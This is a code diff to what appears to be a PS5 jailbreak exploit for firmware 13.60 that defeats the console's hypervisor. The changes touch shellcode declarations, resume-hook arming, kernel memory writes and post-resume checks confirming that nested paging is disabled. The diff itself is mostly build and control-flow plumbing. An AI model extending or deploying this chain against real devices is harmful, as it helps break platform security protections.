@@ -31,10 +31,20 @@
 #include "config.h"
 #include "hv_defeat_1360.h"
 #include "linux.h"
-#include "shellcode_hv.h"
-#include "break_hv.h"
-#include "takeover.h"
 #include "utils.h"
+
+/*
+ * The generated shellcode headers define their blobs as non-static globals, so
+ * including them in this file too would give the linker two definitions of each
+ * (hv_defeat_1320.c is the translation unit that includes them). Declare only
+ * what this file needs; the objects come from hv_defeat_1320.c.
+ */
+extern unsigned char break_hv_bin[];
+extern unsigned int break_hv_bin_len;
+extern unsigned char shellcode_hv_bin[];
+extern unsigned int shellcode_hv_bin_len;
+extern unsigned char takeover_bin[];
+extern unsigned int takeover_bin_len;
 
 #include <ps5/kernel.h>
 #include <stddef.h>
@@ -93,6 +103,7 @@
 static uint64_t g_oracle;
 static uint64_t g_payload_va;
 static int g_armed;
+static int g_redirected;
 
 #ifdef PL5_OFFSETS_MODE
 /* Provided by tools/pl5-offsets.c when the offsets-dump payload is built: the
@@ -156,6 +167,7 @@ static void report_patch_state(void) {
 }
 #endif /* PL5_1360_TAKEOVER */
 
+#if PL5_1360_TAKEOVER
 /* Hex-dump `n` kernel bytes at `a` (one notification). */
 static void log_hex(const char *tag, uint64_t a, int n) {
   static const char hexd[] = "0123456789abcdef";
@@ -174,6 +186,7 @@ static void log_hex(const char *tag, uint64_t a, int n) {
     b[0] = 0;
   notify("13.60: %s @ %#lx = %s\n", tag, (unsigned long)a, b);
 }
+#endif /* PL5_1360_TAKEOVER */
 
 /*
  * Fail fast (with a notification) if the fields the *escape* (phase A) needs
@@ -282,6 +295,7 @@ static void map_payload_executable(uint64_t kernel_pmap) {
   }
 }
 
+#if PL5_DIAG >= 4
 /* Log the payload page's translation in a given pmap: entry addresses, values,
  * NX bit and huge-page (PS) bit at each level. Diagnostic only. */
 static void log_payload_nx(uint64_t pmap, const char *label) {
@@ -309,12 +323,14 @@ static void log_payload_nx(uint64_t pmap, const char *label) {
            (unsigned long)e, (unsigned long)PDE_FIELD(e, EXECUTE_DISABLE));
   }
 }
+#endif /* PL5_DIAG >= 4 */
 
 /* HV loader carveout base. Retail/"regular" SoC only: sceKernelGetMainSocId() is
  * not resolvable by elfldr on retail (undefined import), so we cannot probe the
  * SoC id at runtime. The Pro variant (HV_LOADER_PA_PRO) is not handled here. */
 static uint64_t hv_base_pa(void) { return env_offset.HV_LOADER_PA_REGULAR; }
 
+#if PL5_1360_TAKEOVER
 /*
  * Stage everything shellcode_hv needs into the identity-mapped cave before we
  * enter rest mode. shellcode_hv runs with the identity CR3, so everything it
@@ -409,6 +425,7 @@ static int stage_hv_boot(void) {
          (unsigned long)info.initrd);
   return 0;
 }
+#endif /* PL5_1360_TAKEOVER */
 
 /*
  * Stage the break_hv payload + its Byepervisor param block at
@@ -506,6 +523,7 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
   g_oracle = oracle;
   g_payload_va = payload_va;
   g_armed = 1;
+  g_redirected = redirect;
 
   kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
   kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
@@ -534,20 +552,28 @@ int hv_defeat_1360_post_resume(void) {
     return -1;
   }
 
-  /* The resume payload may take a moment (and the process is frozen while the
-   * console is actually asleep). Poll until break_hv stamps the cookie, which
-   * only happens on a genuine resume -- so [W] proves we really woke up. */
-  for (int i = 0; i < 300 && cookie == 0; i++) {
-    cookie = kread64(g_oracle);
-    if (cookie == 0)
-      sleep(2);
+  if (g_redirected) {
+    /* break_hv runs at the HV's startup_mp call and stamps the cookie, which
+     * only happens on a genuine resume -- so [W] proves we really woke up.
+     * Without the redirect (diag<2) break_hv is never armed and no cookie will
+     * ever appear, so skip the wait and let the offsets dump run. */
+    for (int i = 0; i < 300 && cookie == 0; i++) {
+      cookie = kread64(g_oracle);
+      if (cookie == 0)
+        sleep(2);
+    }
+    if (cookie == 0) {
+      notify("13.60: [X] never resumed / break_hv never ran (no cookie).\n");
+      return -1;
+    }
+    notify(
+        "13.60: [W] resumed from rest mode (diag=%d); cookie=%#lx NPT disabled.\n",
+        PL5_DIAG, (unsigned long)cookie);
+  } else {
+    notify("13.60: [W] resumed from rest mode (diag=%d, no redirect: break_hv not "
+           "armed, no cookie expected, NPT still on).\n",
+           PL5_DIAG);
   }
-  if (cookie == 0) {
-    notify("13.60: [X] never resumed / break_hv never ran (no cookie).\n");
-    return -1;
-  }
-  notify("13.60: [W] resumed from rest mode (diag=%d); cookie=%#lx NPT disabled.\n",
-         PL5_DIAG, (unsigned long)cookie);
   log_reopen();
 
   /* The network + filesystem come back a beat after the CPU resumes; the wake
@@ -585,7 +611,6 @@ int hv_defeat_1360_post_resume(void) {
   notify("13.60: [W1] escape complete; HV defeated, NPT off. Patch sites:"
          " vmmcall-handler/CFI unknown for 13.60 -> takeover (phase B) not"
          " built; see hv_defeat_1360.c. Console left running.\n");
-  (void)log_hex;
   return 0;
 #else
   khook_t hook;
@@ -755,7 +780,17 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
 #endif
 
   if (kread64(cave_addr + CAVE_STATE_OFF) == STATE_ARMED) {
-    notify("13.60: hook already armed (state survived).\n");
+    /* The hook is already installed in this boot -- typically by another payload
+     * that armed it and did not survive rest mode (e.g. Byepervisor-Reborn,
+     * which uses the same cave offsets, magic and cookie). Its chain writes the
+     * cookie to the same deterministic oracle and its resume redirect points at
+     * the same payload page, so adopt that state instead of returning inert
+     * (which would leave g_armed == 0 and produce no post-resume dump). */
+    g_oracle = cave_addr + KH_OFF_USER;
+    g_payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
+    g_armed = 1;
+    g_redirected = 1;
+    notify("13.60: hook already armed (state survived); adopting it.\n");
     return 0;
   }
 
